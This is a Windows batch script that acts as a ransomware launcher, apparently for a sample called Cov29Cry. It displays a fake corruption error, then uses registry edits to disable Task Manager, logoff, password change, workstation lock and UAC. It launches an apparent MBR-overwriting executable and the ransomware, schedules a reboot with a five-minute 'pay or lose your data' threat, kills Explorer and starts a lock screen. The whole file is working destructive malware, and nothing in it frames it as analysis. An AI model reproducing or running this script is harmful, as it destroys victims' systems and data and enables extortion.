@echo off
echo Msgbox "Error: File corrupted! This program has been manipulated and maybe it's infected by a Virus or cracked. This file won't work anymore.">fakeerror.vbs
start fakeerror.vbs
ping localhost -n 2
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v HideFastUserSwitching /t REG_DWORD /d 1 /f
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableChangePassword /t REG_DWORD /d 1 /f
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableLockWorkstation /t REG_DWORD /d 1 /f
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoLogoff /t REG_DWORD /d 1 /f
reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f
reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
copy /y mbr.exe.danger mbr.exe
start mbr.exe
copy /y Cov29Cry.exe.death Cov29Cry.exe
start Cov29Cry.exe
shutdown /r /t 300 /c "5 minutes to pay until you lose your data and system forever"
ping localhost -n 9
taskkill /f /im explorer.exe
start Cov29LockScreen.exe